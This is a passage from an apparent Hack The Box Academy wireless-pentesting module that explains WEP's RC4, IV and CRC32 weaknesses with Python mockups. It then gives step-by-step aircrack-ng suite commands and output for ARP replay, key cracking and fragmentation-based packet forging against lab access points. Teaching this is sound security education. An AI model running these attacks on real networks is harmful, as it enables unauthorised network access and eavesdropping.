# Wired Equivalent Privacy Overview

* * *

Open networks are vulnerable to eavesdropping because their traffic is not encrypted. To address this, Wired Equivalent Privacy (WEP) was introduced in 1997 as part of the [IEEE 802.11](https://www.ieee802.org/11/) standard. It aimed to provide a level of privacy for data transmitted over wireless networks.

WEP, being an older standard, offers valuable lessons for us when dealing with communication ciphers. It has since been replaced by Wi-Fi Protected Access, but can still be found in some business environments. WEP makes use of initialization vectors (IVs), a 40-bit or 104-bit shared key (also referred to as the WEP key), the Rivest Cipher 4 (RC4) algorithm, and cyclic redundancy checks (CRC32) to provide encryption for wireless communications. When WEP was developed, it originally incorporated a 24-bit initialization vector due to U.S. government export restrictions on cryptographic technologies, which limited key sizes. After these restrictions were lifted, WEP was updated to support a 128-bit encryption key, but incidentally it continued to use the same 24-bit initialization vector.

Although WEP held firm as a standard for a while, the discovery of different attacks led to multiple ways of compromising the shared key. This is due to the initialization vectors and cyclic redundancy checks used in the overall cipher. Regardless of whether WEP uses a 64-bit or 128-bit encryption key, the IV remains 24 bits. As a result, the algorithm is prone to repeated IVs during transmission. This has since enabled adversaries to construct decryption tables and retrieve the key with a high degree of statistical certainty, typically through packet building and replay attacks.

* * *

## RC4 Algorithm

In cryptography, `RC4 (Rivest Cipher 4)`, also known as `ARC4` or `ARCFOUR (Alleged RC4)`, is a stream cipher. It was designed by Ron Rivest of [RSA Security](https://en.wikipedia.org/wiki/RSA_Security) in 1987 and became part of several commonly used encryption protocols and standards (including WEP) due to its simplicity and high speed.

RC4 is a symmetric cipher, which means the same key is used for both encryption and decryption. It generates a stream of bits that are XORed with the plaintext to produce the ciphertext. To decrypt the data, the ciphertext is XORed with the same key stream to recover the plaintext.

RC4 consists of two key components:

1. Key Scheduling Algorithm (KSA)
2. Pseudo Random Generation Algorithm (PRGA)

The `Key Scheduling Algorithm` initializes the state table using the WEP key and the initialization vector (IV). The `Pseudo Random Generation Algorithm` produces the keystream used for the encryption and decryption process. In the upcoming section, we will delve deeper into the RC4 algorithm, exploring its mechanisms and functionality in greater detail.

* * *

## WEP Authentication

WEP supports two types of authentication systems: `Open` and `Shared`. In open authentication, a client does not provide any credentials when connecting to the access point (AP). However, to encrypt and decrypt data frames, the client must have the correct key.

In shared authentication, a challenge text is sent to the client during the authentication process. The client must encrypt this challenge text with the WEP key and send it back to the AP for verification. This process allows the client to prove that it knows the key. Upon receiving the encrypted challenge text, the AP attempts to decrypt it. If the decryption is successful and the decrypted text matches the original challenge text, the client is permitted to associate with the access point.

![image](https://academy.hackthebox.com/storage/modules/222/Auth_Methods/Wep_process.png)

Below is a step-by-step description of the shared WEP authentication process, which can be visualized in the diagram above:

1. `Authentication Request`: The process begins with the client sending an authentication request to the access point.
2. `Challenge`: The access point responds with a custom authentication response that includes challenge text for the client.
3. `Challenge Response`: The client then replies with the encrypted challenge, which is encrypted using the WEP key.
4. `Verification`: The AP decrypts the challenge, and sends back an indication of success or failure.

The use of WEP is less common in modern environments, but can still be encountered in older systems with compatibility issues. As such, WEP attacks are a valuable addition to a wireless pentester's arsenal.

Note: After spawning, please wait `3`- `4` minutes before connecting to the target(s).


# WEP Encryption Algorithm Overview

* * *

Wired Equivalent Privacy utilizes 40-bit or 104-bit keys in combination with a 24-bit initialization vector to create the seed. Due to the correlation between the two, the [FMS (Fluhrer, Mantin, and Shamir)](https://en.wikipedia.org/wiki/Fluhrer,_Mantin_and_Shamir_attack) and [PTW (Pyshkin, Tews, and Weinmann)](https://eprint.iacr.org/2007/120.pdf) attacks allow us to retrieve a correct key after gathering enough packets. Alternatively, brute force attacks exist on a per-packet basis, which also allow us to retrieve the key. Packet-building attacks, such as ARP replay, fragmentation, and others, enable us to expedite the process of initialization vector generation. The goal is to collect enough initialization vectors in a capture file to crack the key using probability algorithms.

![image](https://academy.hackthebox.com/storage/modules/185/Diagrams/wep_1.png)

The algorithm for WEP follows a fairly standard procedure for generating a keystream through the RC4 algorithm, which then undergoes a bitwise operation with the packet plaintext and cyclic redundancy check. It can be broken down into the following steps:

- The 24-bit `Initialization Vector (IV)` is generated.
- The `40-bit` or `104-bit Key` is combined with the initialization vector to make the `Seed`.
- The `Seed ` is passed through the stages of the RC4 algorithm, which includes the Key Scheduling Algorithm and the Pseudo Random Generation Algorithm, to create the `Keystream`.
- The `Cyclic Redundancy Check` is calculated and appended to the `Packet Plain Text`, forming the `ICV message`.
- The unencrypted `ICV message` and `Keystream` undergo a `XOR Bitwise Operation` to produce the `Final Ciphertext`.
- The IV is concatenated with the final ciphertext, resulting in the `final message` to be transmitted.

At a high level, the algorithm for Wired Equivalent Privacy (WEP) utilizes random seeds. However, the 24-bit initialization vector (IV) has a limited range, making it prone to repetition. In tandem with this, the IV is transmitted in cleartext alongside the encrypted data. This is where the problem innately lies: we know one of the two inputs for the RC4 algorithm, which allows us to limit our guesses and use probability-based analysis to determine the key. As a result, attackers are able to crack the key much more quickly than any WPA network. In the following sections, we will explore how to reconstruct each part of the WEP algorithm using Python.


# Seed Generation and the RC4 Algorithm

* * *

In order to fully utilize RC4 encryption, two main inputs are required. The first is the message to be encrypted. The second input is the key, which, in standard RC4, is directly passed into the algorithms that initialize the cipher. However, in the case of WEP, the key is actually a `'seed'` formed by concatenating a randomly generated 24-bit initialization vector (IV) with a 40-bit, 104-bit, or in some cases, 232-bit general key.

The RC4 algorithm operates in two phases: the `Key Scheduling Algorithm (KSA)` and the `Pseudo-Random Generation Algorithm (PRGA)`. The KSA initializes and permutates the internal state array, using the key (or seed, in WEP's case) to shuffle its values. This shuffled array is then processed by the PRGA, which produces a keystream of the same length as the plaintext message. The keystream is XORed with the message to generate the ciphertext.

![image](https://academy.hackthebox.com/storage/modules/185/Diagrams/wep_3.png)

Fortunately, we don't have to write out this entire algorithm ourselves. The Python `PyCryptodome` library has an [ARC4](https://pycryptodome.readthedocs.io/en/latest/src/cipher/arc4.html) module for this very purpose. Let's use it to encrypt something.

* * *

With this example script, our goal is to encrypt the phrase 'Wired Equivalent Privacy' with both a 64-bit and 128-bit seed. First, we generate the random 3-byte initialization vector (IV) using `get_random_bytes`. We then concatenate the IV and Key together to make the full seed. The seed is passed into the two phases of the RC4 algorithm to create the keystream, which is then XORed with our 'Wired Equivalent Privacy Message'.

```python
import Crypto
from Crypto.Random import get_random_bytes
import binascii
from Crypto.Cipher import ARC4

# Generating the 24-bit (3 byte) Initialization Vector
IV = get_random_bytes(3)

# Creating the 40-bit key (5 bytes)
key = b'\x01\x02\x03\x04\x05'
Seed64 = IV + key

# We can also use a 104-bit key (13 bytes)
key104 = b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D'
Seed128 = IV + key104

print('Initialization Vector: ' + str(IV))
print('64-bit Seed: ' + str(Seed64))
print('128-bit Seed: ' + str(Seed128))

# We must use the RC4 cipher to encrypt the plain text. We will explore how to generate the CRC32 and ICV Message in the next session.
# The RC4 cipher consists of the Key-Scheduling Algorithm and the Pseudo-random Generation Algorithm, which outputs the keystream.

# Generating the keystream using RC4
keystream = ARC4.new(Seed64)
keystreamB = ARC4.new(Seed128)

# The plain text is XORed with the keystream to produce the ciphertext.
msg = keystream.encrypt(b'Wired Equivalent Privacy')
print(msg)

```

We can see the algorithm in action using the following command.

```shell
python3 SeedGen.py

Initialization Vector: b'y#K'
64-bit Seed: b'yK\x01\x02\x03\x04\x05'
128-bit Seed: b'yK\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\x0c\r'
b')c\xe96\xf0\xab\x10\x9b\xa2\x9f\xdd\x19\xff\xf5\x81\xd5\xe2\xe9-x\x16\x96%n'

```

```shell
python3 SeedGen.py

Initialization Vector: b'\xdb\x10o'
64-bit Seed: b'\xdb\x10o\x01\x02\x03\x04\x05'
128-bit Seed: b'\xdb\x10o\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\x0c\r'
b'\xf4kR\x06/3\x08 O\x9a\xa2\x99\x9a\x93\xe5\x16\x89\x9f\x7f\x92\x1d\xd1\x1b\xb7'

```

It is worth noting that each iteration of this cipher is different, as the initialization vector is randomly generated per packet. Generally, stream ciphers use a key that is the same length as the message being encrypted. This means that in order to decrypt the message, either the key or the original plaintext is required. However, in the case of WEP, the IV is attached to the packet. Otherwise, it would be impossible to decrypt without the full seed. The correlation between the IV and the final message has allowed attackers to break this once theoretically sound algorithm apart.

Next, we will be focusing on CRC32 generation to create the final ICV message. Once this is done, we will be able to combine all of the examples together to create a full mockup algorithm for WEP.


# CRC32 Generation (WEP's ICV Algorithm)

* * *

Wired Equivalent Privacy utilizes a standard [CRC32 checksum](https://fuchsia.googlesource.com/third_party/wuffs/+/HEAD/std/crc32/README.md), which is computed over the packet plaintext and subsequently appended to it. The combined plaintext/checksum block is then XORed with the RC4 keystream to produce the final ciphertext. The `KoreK Chop Chop Attack` is notorious for abusing the CRC32 hashing function to decrypt a packet without knowing the key. Simply put, this is done by removing a byte of the final ciphertext, calculating the new ICV, then sending the modified packet back to the network. Based on the network's response (whether the packet is accepted or rejected), the attacker can infer the byte's true value. By repeating this process for each byte, the attacker can gradually decrypt the entire packet. We will explore this in further detail later.

Generally, the CRC32 hashing algorithm is the following:

`g(x) = x32 + x26 + x23 + x22 + x16 + x12 + x11 + x10 + x8 + x7 + x5 + x4 + x2 + x + 1`

![image](https://academy.hackthebox.com/storage/modules/185/Diagrams/wep_2.png)

We can calculate the CRC32 checksum using the Python [zlib](https://docs.python.org/3/library/zlib.html#zlib.crc32) library. With the script below, we will take our packet plaintext 'Something Sensitive' and find the checksum value for it.

```python
import zlib

# First we declare our packet plaintext. In normal communications this is the actual plaintext data.
packetplaintext = b'Something Sensitive'

# We then use the zlib library to calculate the CRC32.
crc32 = zlib.crc32(packetplaintext)

print(crc32)

```

We can see CRC32 in action by employing the following command.

```shell
python3 CRC32.py

2950664974

```

At this point, we have both inputs for the RC4 algorithm and can proceed with constructing a full mockup of the WEP algorithm. WEP contains numerous vulnerabilities, each of which can be exploited through different stages of the algorithm.


# Putting Together the Algorithms

* * *

We can put together the Seed Generation and CRC32 Generation scripts with the RC4 library to construct a complete mockup of the WEP algorithm. In this combined script, we first add the initialization vector (IV) and the key, forming the seed. Next, we use the seed to produce the keystream. We then create our message to be encrypted by calculating the CRC32 checksum and concatenating it with our packet plaintext. The resulting plaintext block is subsequently passed into RC4's encrypt function to generate our final ciphertext. Lastly, the initialization vector is prepended to the final ciphertext, resulting in our final message to be transmitted.

```python
import Crypto
from Crypto.Random import get_random_bytes
from Crypto.Cipher import ARC4
import binascii
import zlib

# First we declare our packet plain text, this is the unencrypted message that we need to pass through our mock WEP algorithm
packetplaintext = b'Something Sensitive'

# Then we calculate the CRC32 checksum (32-bit integer) of our packet plain text
crc32 = zlib.crc32(packetplaintext)

# Generating the 24-bit Initialization Vector (3 bytes)
IV = get_random_bytes(3)

# Declaring our 40-bit key (5 bytes) and 64-bit seed (8 bytes)
key = b'\x01\x02\x03\x04\x05'
Seed64 = IV + key

# Declaring our 104-bit key (13 bytes) and 128-bit seed
key104 = b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D'
Seed128 = IV + key104

# Generating the keystreams
keystream = ARC4.new(Seed64)
keystreamB = ARC4.new(Seed128)

# Constructing our ICV Message
crc32byte = crc32.to_bytes(4, 'big')  # Convert CRC32 checksum from integer to bytes
ICVMessage = packetplaintext + crc32byte # Concatenate the packet plaintext and CRC32 checksum

# Final Ciphertext, made by XORing the ICV Message and keystream
msg = keystream.encrypt(ICVMessage)
msgB = keystreamB.encrypt(ICVMessage)

# Final Message, formed by concatenating the Initialization Vector with the Final Cipher Text
finalmsg = IV + msg
finalmsgb = IV + msgB

print('-------------')
print('CRC32 Checksum: ' + str(crc32))
print('Initialization Vector: ' + str(IV))
print('64-bit Seed: ' + str(Seed64))
print('128-bit Seed: ' + str(Seed128))
print('-------------')
print('ICV Message: ' + str(ICVMessage))
print('Cipher Text 64-bit Seed: ' + str(msg))
print('Cipher Text 128-bit Seed: ' + str(msgB))
print('-------------')
print('Final Message 64-bit Seed: ' + str(finalmsg))
print('Final Message 128-bit Seed: ' + str(finalmsgb))

```

To put this final mockup algorithm to the test, we employ the following command:

```shell
python3 mockcipher.py

-------------
CRC32 Checksum: 2950664974
Initialization Vector: b']~\xb7'
64-bit Seed: b']~\xb7\x01\x02\x03\x04\x05'
128-bit Seed: b']~\xb7\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\x0c\r'
-------------
ICV Message: b'Something Sensitive\xaf\xdf\x93\x0e'
Cipher Text 64-bit Seed: b"y\x12uhO\x0e\x99\xa0\xd5\xe08\x11\xc6+O'\x81%\xf6\x9a\x89\xa8\x13"
Cipher Text 128-bit Seed: b'\x12u\x96\x0bA\xc1\x07\xe5a-Wt\x84\x14/\x1d\xa6oJ\x1d\x16_\xdb'
-------------
Final Message 64-bit Seed: b"]~\xb7y\x12uhO\x0e\x99\xa0\xd5\xe08\x11\xc6+O'\x81%\xf6\x9a\x89\xa8\x13"
Final Message 128-bit Seed: b']~\xb7\x12u\x96\x0bA\xc1\x07\xe5a-Wt\x84\x14/\x1d\xa6oJ\x1d\x16_\xdb'

```

As we can see, the final message is different each time the script is run. This is due to the IV being randomly generated, as we have mentioned previously.

```shell
python3 mockcipher.py

-------------
CRC32 Checksum: 2950664974
Initialization Vector: b'`\x8a\xa6'
64-bit Seed: b'`\x8a\xa6\x01\x02\x03\x04\x05'
128-bit Seed: b'`\x8a\xa6\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\x0c\r'
-------------
ICV Message: b'Something Sensitive\xaf\xdf\x93\x0e'
Cipher Text 64-bit Seed: b'\xe4\xaa\xa3n\xb5\x9e\xc0\xd4P=L\xcc\x9c\xb6\xb7?\xbfB\xcd\xf1HR\xa6'
Cipher Text 128-bit Seed: b'\x10\xbb\x86\x89E\x9b\xe0HLf\xb6\xeb\x1e\xf6_j\xe6n,\xb0\xdd\xd0\x08'
-------------
Final Message 64-bit Seed: b'`\x8a\xa6\xe4\xaa\xa3n\xb5\x9e\xc0\xd4P=L\xcc\x9c\xb6\xb7?\xbfB\xcd\xf1HR\xa6'
Final Message 128-bit Seed: b'`\x8a\xa6\x10\xbb\x86\x89E\x9b\xe0HLf\xb6\xeb\x1e\xf6_j\xe6n,\xb0\xdd\xd0\x08'

```

Next, we will explore how to find the initialization vector for a WEP packet in Wireshark. Doing so will allow us to understand how easy it is for attackers to retrieve this portion of the seed.


# Finding the Initialization Vector with Wireshark

* * *

In this section, we will explore how the `Integrity Check Value (ICV)` and `Initialization Vector (IV)` can be acquired using the Aircrack suite. We do so by listening to communications between the target access point and connected stations. The traffic will be output to a capture file, which we can open with Wireshark.

Let's begin by listing the available wireless interfaces on our attack host.

```shell
iwconfig

lo        no wireless extensions.

eth0      no wireless extensions.

wlan0     IEEE 802.11  ESSID:off/any
         Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
         Retry short  long limit:2   RTS thr:off   Fragment thr:off
         Power Management:off

```

Prior to scanning, we must enable monitor mode.

```shell
sudo airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

   PID Name
   602 avahi-daemon
   614 avahi-daemon
   700 NetworkManager
   701 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT****

```

Should there be any conflicting processes, the following command will kill them.

```shell
sudo airmon-ng check kill

Killing these processes:

   PID Name
   701 wpa_supplicant

```

We can now resume our efforts, broadly scanning in search of wireless networks that use WEP.

```shell
sudo airodump-ng wlan0mon

CH 11 ][ Elapsed: 0 s ][ 2022-12-28 17:37

BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

60:38:E0:71:E9:DC   -3        2        0    0   3   54e. WEP  WEP         HTB-Wireless
7C:XX:XX:XX:XX:XX  -41        1        0    0   6  130   WPA2 CCMP   PSK  FakeNetwork
7C:XX:XX:XX:XX:XX  -46        1        0    0  10  130   WPA2 CCMP   PSK  FakeNetwork
7C:XX:XX:XX:XX:XX  -48        1        0    0  11  130   WPA2 CCMP   PSK  FakeNetwork
7C:XX:XX:XX:XX:XX  -42        1        0    0  11  130   WPA2 CCMP   PSK  FakeNetwork
7C:XX:XX:XX:XX:XX  -45        1        0    0  11  130   WPA2 CCMP   PSK  FakeNetwork
7C:XX:XX:XX:XX:XX  -44        1        0    0  11  130   WPA2 CCMP   PSK  FakeNetwork

```

Once we know the BSSID and channel of our WEP-enabled target, we can refine the scan results to focus solely on it. Running the command again, we specify the channel the AP operates on with `-c 3` and the name of the capture file with `-w WEP`. The saved file will be used for later analysis.

```shell
sudo airodump-ng -c 3 --bssid 60:38:E0:71:E9:DC wlan0mon -w WEP

  CH  3 ][ Elapsed: 48 s ][ 2022-12-28 17:40

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 60:38:E0:71:E9:DC   -3 100      445      731   28   3   54e. WEP  WEP    OPN  HTB-Wireless

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 60:38:E0:71:E9:DC  2C:6D:C1:XX:XX:XX  -22   54e-54e     2      464

```

After scanning for a few seconds, we can terminate the session and open the capture file in Wireshark. By selecting any IEEE [802.11 data packet](https://wiki.wireshark.org/Wi-Fi) and expanding the `'IEEE 802.11 Data'` and `'WEP Parameters'` sections, we can view the packet's initialization vector (IV) along with the message ICV (CRC32). As previously mentioned, the IV is attached to the encrypted message, allowing us to extract it from the captured packets.

![image](https://academy.hackthebox.com/storage/modules/185/Wireshark/IV.png)

* * *

## Moving On

The more packets we capture, the more initialization vectors (IVs) we are able to obtain, making it easier to crack the key using `aircrack-ng`. In the following sections, we will explore various WEP attack techniques, each typically having the similar goal of generating IVs. While these attacks differ in their approach, they generally involve replaying ARP requests or other packets of valid network traffic. This process produces enough IVs to build a decryption table and eventually recover the WEP key.


# ARP Request Replay Attack

* * *

The classic [ARP Request Replay Attack](https://www.aircrack-ng.org/doku.php?id=arp-request_reinjection) is a highly effective and reliable method for generating new initialization vectors (IVs). In this attack, an ARP packet is captured and retransmitted back to the access point (AP). This action prompts the AP to resend the packet, but with a new IV each time. The continuous replay of the same ARP packet forces the AP to respond repeatedly with different IVs. Collecting these packets with new IVs allows for the eventual determination of the WEP key.

To conduct an ARP Request Replay attack, `aireplay-ng` will be used to capture a valid ARP request, which is then replayed continuously until enough initialization vectors are gathered to crack the key (using either the `Korek/FMS` attack or the default `PTW` attack).

* * *

We first need to enable monitor mode on our wireless network interface. This allows us to capture and inject packets.

#### Enabling Monitor Mode

```shell
sudo airmon-ng start wlan0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)

```

We can test to see if our interface is in monitor mode with the `iwconfig` utility.

```shell
iwconfig

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=30 dBm
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off

```

* * *

#### Performing the Attack

To begin, we scan our target access point using `airodump-ng` and capture the communication into a file. We specify our interface in monitor mode with `wlan0mon`, the channel our access point is running on with `-c`, and the name/path of our capture file with the `-w` argument.

```shell
airodump-ng wlan0mon -c 1 -w WEP

10:00:17  Created capture file "WEP-01.cap".

 CH  1 ][ Elapsed: 12 s ][ 2024-08-05 10:00

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 B2:D1:AC:E1:21:D1  -47 100      149        7    0   1   11   WEP  WEP         HackTheWifi

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 B2:D1:AC:E1:21:D1  4A:DD:C6:71:5A:3B  -29    1 - 5      0        6

```

The above command will continuously scan the target access point and capture the communication, saving it into a file named `WEP-01.cap`. If there were multiple access points (APs) available and we wanted to focus on one specifically, we would use the `-b` option followed by the BSSID of the target AP.

In a second terminal, we can launch the ARP request replay attack using `aireplay-ng`. We specify the ARP request replay attack mode with `-3`, the BSSID of the target AP with `-b`, and the client MAC address with `-h`. Once a valid ARP request is captured, the tool will replay it automatically.

```shell
sudo aireplay-ng -3 -b B2:D1:AC:E1:21:D1 -h 4A:DD:C6:71:5A:3B wlan0mon

The interface MAC (02:00:00:00:01:00) doesn't match the specified MAC (-h).
        ifconfig wlan0mon hw ether 4A:DD:C6:71:5A:3B
10:01:29  Waiting for beacon frame (BSSID: B2:D1:AC:E1:21:D1) on channel 1
Saving ARP requests in replay_arp-0805-100129.cap
You should also start airodump-ng to capture replies.
Read 99 packets (got 0 ARP requests), sent 0 packets...

```

Initially, the number of captured ARP requests will be zero. When a valid ARP request is captured, it will be replayed multiple times, causing the number of captured ARP requests to increase rapidly.

```shell
Read 195576 packets (got 35039 ARP requests and 0 ACKs), sent 34758 packets...(500 pps)

```

Once we have generated enough ARP traffic, we can attempt to crack the key with `aircrack-ng`. We supply the `-b` option followed by our target BSSID, along with the `WEP-01.cap` file, where all the initialization vectors are stored.

```shell
aircrack-ng -b B2:D1:AC:E1:21:D1 WEP-01.cap

Reading packets, please wait...
Opening WEP-01.cap
Read 195576 packets.

1 potential targets
Got 97822 out of 95000 IVs
Starting PTW attack with 97822 IVs.
                     KEY FOUND! [ 33:44:55:22:11 ]
Attack Decrypted correctly: 100% captured IVs.

```

With this retrieved key, we can either connect directly to the target network, or decrypt the traffic with `airdecap-ng`.

![image](https://academy.hackthebox.com/storage/modules/185/Diagrams/connect.png)

The default cracking method in `aircrack-ng` is the `PTW (Pyshkin, Tews, Weinmann)` statistical attack, which requires approximately 20,000 initialization vectors for 64-bit keys and 40,000 or more for 128-bit keys. To use the `Korek/FMS` attack, we can specify `-K` in the command, though it requires significantly more IVs—around 250,000 for 64-bit keys and 1.5 million for 128-bit keys—making it slower compared to the PTW attack. For more details, you can refer to the [aircrack-ng documentation](https://www.aircrack-ng.org/doku.php?id=aircrack-ng&s%5B%5D=ptw).

* * *

## Moving On

In this section, we demonstrated how to generate initialization vectors (IVs) using the `ARP Request Replay Attack`. By capturing and replaying ARP requests, we were able to accumulate enough IVs to crack the WEP key. In the next section, we will explore an alternative method for generating IVs using the `Fragmentation Attack`.


# Fragmentation Attack

* * *

By now, we have learned that if we generate enough unique initialization vectors (IVs) and save the communication to a file, it enables us to crack the key. For an `ARP request replay attack`, capturing a valid ARP request (broadcast request) in the network is essential. However, if no ARP requests are being made, we can use a [Fragmentation Attack](https://www.aircrack-ng.org/doku.php?id=fragmentation) instead. This attack achieves the same goal, but through an entirely different method: using fragmented packets to recover the PRGA (Pseudo Random Generation Algorithm) keystream.

PRGA bytes allow us to forge any packet. This works because encryption in WEP is simply a XOR operation between the PRGA and the plaintext message. Knowing this, we can use any IV to encrypt arbitrary data. Similarly, if both a packet's plaintext and ciphertext are known, the PRGA can be derived.

In 802.11 communications, almost all packets are encapsulated with an [LLC/SNAP header](https://dox.ipxe.org/structieee80211__llc__snap__header.html). The first 7 bytes of this header are always the same, and the 8th byte varies based on whether the packet is ARP or IP. Since ARP packets are always 36 bytes, they can be easily distinguished from IP packets. When we capture a packet, we immediately know at least 8 bytes of plaintext, and thus can derive 8 bytes of the PRGA.

Fragmentation further accelerates the process of PRGA recovery. Because WEP encryption is applied to each individual fragment, we can exploit this by crafting a long broadcast packet with known data and splitting it into smaller fragments. Each fragment allows us to leverage the 8-byte PRGA we've recovered, and when the access point reassembles these fragments, we can capture the full packet and derive even more PRGA. By repeating this process with additional fragments, we quickly collect enough keystream data (1500 bytes) to forge any packet. This allows us to subsequently craft an ARP request and perform an `ARP Request Relay` attack.

* * *

We first need to enable monitor mode on our wireless network interface. This allows us to capture and inject packets.

#### Enabling Monitor Mode

```shell

sudo airmon-ng start wlan0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)

```

After setting the interface into monitor mode, we can verify the change by using the `iwconfig` utility.

```shell
iwconfig

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=30 dBm
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off

```

* * *

#### Performing the Attack

We begin by scanning the target access point using `airodump-ng`, capturing the communication into a file. The interface in monitor mode is specified using `wlan0mon`, the access point's channel with `-c`, and the output location with the `-w` argument.

```shell
airodump-ng wlan0mon -c 1 -w WEP

18:58:49  Created capture file "WEP-01.cap".

 CH  1 ][ Elapsed: 18 mins ][ 2024-08-05 19:16

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 A2:BD:32:EB:21:15  -47   0    10632      264    0   1   11   WEP  WEP         HackTheWifi

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 A2:BD:32:EB:21:15  42:E9:11:39:88:AE  -29    2 - 1      0      266

```

Next, we initiate the fragmentation attack with the following command. The `-5` option indicates the fragmentation attack, while `-b` specifies the BSSID of the AP, and `-h` is the MAC address of the connected station (or any source address that can associate with the AP).

```shell
aireplay-ng -5 -b A2:BD:32:EB:21:15 -h 42:E9:11:39:88:AE wlan0mon

The interface MAC (02:00:00:00:01:00) doesn't match the specified MAC (-h).
        ifconfig wlan0mon hw ether 42:E9:11:39:88:AE
19:18:35  Waiting for beacon frame (BSSID: A2:BD:32:EB:21:15) on channel 1
19:18:35  Waiting for a data packet...
Read 66 packets...

        Size: 100, FromDS: 0, ToDS: 1 (WEP)

              BSSID  =  A2:BD:32:EB:21:15
          Dest. MAC  =  A2:BD:32:EB:21:15
         Source MAC  =  42:E9:11:39:88:AE

        0x0000:  0841 0201 d8d6 3deb 29d5 42e9 1139 88ae  .A....=.).B..9..
        0x0010:  d8d6 3deb 29d5 1026 4f54 f100 dca9 17cd  ..=.)..&OT......
        0x0020:  7d16 6690 e06e 2bbf 45e6 416b f0a0 5e22  }.f..n+.E.Ak..^"
        0x0030:  a8a7 dc23 ba6b 8e83 7523 21e3 4429 f6a2  ...#.k..u#!.D)..
        0x0040:  72f1 a051 a481 1cb7 c983 7653 9db4 cb71  r..Q......vS...q
        0x0050:  d4ca 075d 1117 59b8 aa8d 2779 582b 7f52  ...]..Y...'yX+R
        0x0060:  339e d3be                                3...

Use this packet ? y

Saving chosen packet in replay_src-0805-191842.cap
19:18:51  Data packet found!
19:18:51  Sending fragmented packet
19:18:51  Got RELAYED packet!!
19:18:51  Trying to get 384 bytes of a keystream
19:18:51  Got RELAYED packet!!
19:18:51  Trying to get 1500 bytes of a keystream
19:18:51  Got RELAYED packet!!
Saving keystream in fragment-0805-191851.xor
Now you can build a packet with packetforge-ng out of that 1500 bytes keystream

```

A successful fragmentation attack will display an output indicating that the PRGA `xor` file has been saved. Afterward, we need to analyze the capture file to identify the source and destination IP addresses, as well as the MAC addresses. This can be accomplished with `tcpdump`.

```shell
tcpdump -s 0 -n -e -r replay_src-0805-191842.cap

reading from file replay_src-0805-191842.cap, link-type IEEE802_11 (802.11), snapshot length 65535
13:20:06.328586 CF +QoS BSSID:a2:bd:32:eb:21:15 SA:42:e9:11:39:88:ae DA:a2:bd:32:eb:21:15 LLC, dsap SNAP
(0xaa) Individual, ssap SNAP (0xaa) Command, ctrl 0x03: oui Ethernet (0x000000), ethertype IPv4 (0x0800),
length 67: 192.168.1.129.63870 > 192.168.1.1.53: 34696+ A? outlook.office365.com. (39)

```

Once we have the required addresses, we can forge an ARP request using `packetforge-ng`. In this command, we specify the access point's MAC address with `-a`, the station’s MAC address with `-h`, the access point’s IP address with `-k`, the station’s IP address with `-l`, the location and name of our PRGA file with `-y`, and finally the output name for the forged ARP request capture file with `-w`.

```shell
packetforge-ng -0 -a A2:BD:32:EB:21:15 -h 42:E9:11:39:88:AE -k 192.168.1.1 -l 192.168.1.129 -y fragment-0805-191851.xor -w forgedarp.cap

Wrote packet to: forgedarp.cap

```

If the packet we captured does not contain source or destination IP addresses, we can set the **-k** (access point's IP) option to 255.255.255.255 and the **-l** (station's IP) option to 255.255.255.255. This allows us to handle packets without specified IP addresses by designating them as broadcast addresses.

Once the forged ARP request is written into `forgedarp.cap`, we can inject it into the target network to generate initialization vectors (IVs). One common method for this is using the Aircrack Suite's [Interactive Packet Replay](https://www.aircrack-ng.org/doku.php?id=interactive_packet_replay).

We do so by specifying the interactive packet replay mode with `-2`, the name and location of our forged packet with `-r`, the source MAC address to inject with `-h` and our interface in monitor mode with `wlan0mon` as shown below.

```shell
aireplay-ng -2 -r forgedarp.cap -h 42:E9:11:39:88:AE wlan0mon

The interface MAC (02:00:00:00:01:00) doesn't match the specified MAC (-h).
        ifconfig wlan0mon hw ether 42:E9:11:39:88:AE

        Size: 68, FromDS: 0, ToDS: 1 (WEP)

              BSSID  =  A2:BD:32:EB:21:15
          Dest. MAC  =  FF:FF:FF:FF:FF:FF
         Source MAC  =  42:E9:11:39:88:AE

        0x0000:  0841 0201 d8d6 3deb 29d5 42e9 1139 88ae  .A....=.).B..9..
